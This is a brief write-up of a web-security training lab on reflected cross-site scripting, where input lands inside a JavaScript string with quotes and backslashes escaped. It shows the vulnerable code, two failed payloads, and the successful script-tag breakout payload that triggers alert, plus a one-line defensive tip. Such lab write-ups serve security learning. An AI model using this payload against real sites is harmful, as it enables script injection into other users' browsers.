## Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

Description:
    This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.



Analys:
    1. Looking for vulnerable code
```javascript
var searchTerms = 'asd';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    
```
    
    2. Trying to search some obvious way to exploit lab [' + alert()] & [\' + alert()]

## Result:
#  The search was encoded into 
```javascript    
var searchTerms = '\' + alert(1)';
```
# And
```javascript
var searchTerms = '\\\' + alert()';
```
    3. I can probably try to escape <script> himself in [document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');] by closing it tag;
      3.1 Trying [</script>gfhgfhfg]
## Result: My input after closing tag was inserted into document.


    4. Crafting the exploit [</script><script>alert(1)</script>] -> Lab solved

## Afterwords: You should also be sure that you also incoded angle brackets